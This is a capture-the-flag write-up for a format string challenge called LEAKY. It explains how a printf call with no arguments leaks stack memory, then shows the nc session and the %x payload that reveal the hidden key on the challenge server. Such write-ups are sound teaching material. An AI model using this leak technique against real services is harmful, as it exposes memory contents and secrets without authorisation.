## LEAKY [60]

**Tags**: format string, information leak

**Description**: Leak the key from memory. Source is available at [leaky.c](leaky.c), and the binary's running on `shell.cyberstakesonline.com:14068`.

## Solution
If you call `printf()` with format specifiers (`%x`, `%s`, etc.) in the format string but no corresponding arguments, it will read whatever values happen to be next sequentially on the stack. In this binary, we call `printf()` with an 80-byte format string read from `stdin` but with no other arguments. This gives us plenty of space to add many `%x` format specifiers to print out several values on the stack and hopefully reach the unknown key.

We know that the key is located between `0x11151057` and `0x51757175`:
```C
  unsigned int filler2 = 0x70011115;
  unsigned int filler3 = 0x11151057;
  unsigned int key = ???;
  unsigned int filler4 = 0x51757175;
  unsigned int filler5 = 0x70117175;
```

Just for good measure, we will print out fifteen stack values:
```
ameise@STAHLKERN:~/CS2015/pwn/060_LEAKY$ nc shell.cyberstakesonline.com 14068
%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
804a080 50 f7fc8000 f7fc4000 10757011 10111115 70011115 11151057 50117011 51757175 70117175 70111075 10115117 51101157 2d
```

The key is `0x50117011`.